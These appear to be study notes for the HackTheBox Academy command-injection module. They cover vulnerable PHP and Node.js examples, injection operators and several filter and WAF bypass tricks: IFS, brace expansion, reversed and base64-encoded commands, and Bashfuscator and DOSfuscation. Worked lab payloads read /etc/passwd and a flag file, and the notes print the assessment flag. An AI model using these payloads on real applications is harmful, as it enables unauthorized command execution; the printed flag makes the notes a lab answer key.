# Command Injection  

>[BSCP Study Notes on OS Command Injection](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#os-command-injection)  
>[HackTheBox Command Injection](https://academy.hackthebox.com/module/109/section/1031)  

>PHP Example of executing command directly on the back-end server:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```  

>JavaScript on NodeJS example of web application perform a OS Command injection:  

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```  

## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|-|-|-|-|
|Semicolon| `;`|`%3b`|Both|
|New Line| `\n`|`%0a`|Both|
|Background| `&`|`%26`|Both (second output generally shown first)|
|Pipe| `\|`|`%7c`|Both (only second output is shown)|
|AND| `&&`|`%26%26`|Both (only if first succeeds)|
|OR| `\|\|`|`%7c%7c`|Second, only if first fails [Other Injection Operators](https://academy.hackthebox.com/module/109/section/1034) |
|Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|

>List of injection characters and matching URL encoded as wordlist:  

```
;
%3b
\n
%0a
&
%26
\|
%7c
&&
%26%26
\|\|
%7c%7c
``
%60%60
$()
%24%28%29
```  

---
# Linux

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| **Other Characters** |
| `${PATH:0:1}` | Will be replaced with forward slash `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one to produce back slash (`[` -> `\`) |
| `$(tr '!-}' '"-~'<<<:)` | Character Shifting by one to give a semicolon (`:` -> `;`) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| **Case Manipulation** |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |
| `echo 'whoami' \| rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |

## Bypassing Space Filters  

>Encoded newline `\n` is URL encoded value = `%0a`  

>Bypass Blacklisted Spaces: `127.0.0.1%0a whoami`  

>Using Tabs: `127.0.0.1%0a%09`  

>Using $IFS: `127.0.0.1%0a${IFS}`  

>[Using Brace Expansion](https://academy.hackthebox.com/module/109/section/1036): `127.0.0.1%0a{ls,-la}`  

>Linux command injection to list the contents of the `/home` folder on target and [Bypass the WAF filter](https://academy.hackthebox.com/module/109/section/1037) by using:
```
127.0.0.1%0als${IFS}${PATH:0:1}home
```  


---
# Windows

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |

>In windows using the `~` to not starting character position in string, and minus the length, can produce slash character: `echo %HOMEPATH:~6,-11%`  

## Bashfuscator  

>Linux bash Automated obfuscation tool - [Bashfuscator](https://academy.hackthebox.com/module/109/section/1040).  

```
cd /home/kali/Downloads/htb/academy/command/Bashfuscator/bashfuscator/bin/

bashfuscator -h

./bashfuscator -c 'cat /etc/passwd'
```  

>The output from below bash obfuscater tool is `eval "$(rev <<<'dwssap/cte/ tac')"`  

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```  

>Linux bash Automated obfuscation tool - [DOSfuscation](https://academy.hackthebox.com/module/109/section/1040).  

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
```  

>Reference: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)  

# OS CMD Inject Exercises  

>Use what you learned in [Bypassing Other Blacklisted Characters section](https://academy.hackthebox.com/module/109/section/1037) to find name of the user in the '/home' folder. What user did you find?
```
ip=127.0.0.1%0al's'${IFS}-al${IFS}${PATH:0:1}home
```  

>Use what you learned in [Bypassing Blacklisted Commands section](https://academy.hackthebox.com/module/109/section/1038) find the content of flag.txt in the home folder of the user you previously found.

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```  

>Find the output of the following command using one of the techniques you learned in this section: `find /usr/share/ | grep root | grep mysql | tail -n 1`  

>Base64 encoded `find` command:
```
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 -w 0;echo
```  
>Command injection payload bypassing WAF:
```
ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```  

# Skills Assessment - Command Injection  

>HTB{1nj3c73d_my_f1r57_c0mm4nd}

1nj3c70r

cmd-inject-skill-assess.png


cmd-inject-skill-assess-landing-page.png


